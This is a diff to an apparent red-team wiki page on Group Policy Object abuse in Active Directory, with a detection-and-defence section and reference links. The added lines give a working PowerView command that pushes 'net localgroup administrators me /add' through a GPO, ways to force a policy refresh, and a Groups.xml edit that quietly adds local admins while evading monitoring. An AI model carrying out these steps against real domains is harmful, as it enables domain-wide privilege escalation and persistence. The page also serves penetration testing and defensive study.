@@ -35,6 +35,8 @@ For user-context payloads, drop a logon script (`User\Scripts\Logon\`) and toggl
 
 Restore: always snapshot `GPT.ini`, the affected XML files, and `gPCMachineExtensionNames` before editing so you can revert.
 
+PowerView's `New-GPOImmediateTask -TaskName evil -Command cmd -CommandArguments '/c net localgroup administrators me /add' -GPODisplayName 'Workstation Baseline' -Force` is a one-liner equivalent that handles the XML + GPC version bump for you; if you cannot wait for the 90-minute refresh window you can force the policy pull by running `gpupdate /force` on the target if you already have a foothold there, or trigger it indirectly via a benign reboot/logon you induce. A subtler variant when ScheduledTasks CSE is monitored: edit `Machine\Preferences\Groups\Groups.xml` to add a `<Member name="me" action="ADD" sid=""/>` to local Administrators on every in-scope host — no task, no script, just a group-membership preference that AVs often whitelist.
+
 ## Detection and defence
 - Event 5136 (AD object change) on Group Policy Container objects — filter on attributes `gPCMachineExtensionNames`, `versionNumber`
 - File integrity on SYSVOL: any new `ScheduledTasks.xml`, `Registry.xml`, or `Scripts.ini` is a high-fidelity signal
@@ -45,4 +47,5 @@ Restore: always snapshot `GPT.ini`, the affected XML files, and `gPCMachineExten
 - [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) — Windows tooling and technique writeup
 - [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) — Linux/Impacket equivalent
 - [HackTricks — GPO abuse](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html) — broader ACL→GPO paths
+- [ired.team — privileged accounts and GPO abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) — New-GPOImmediateTask and Groups.xml walkthrough
 - See also: [[acl-abuse]], [[bloodhound]], [[ad-persistence]]
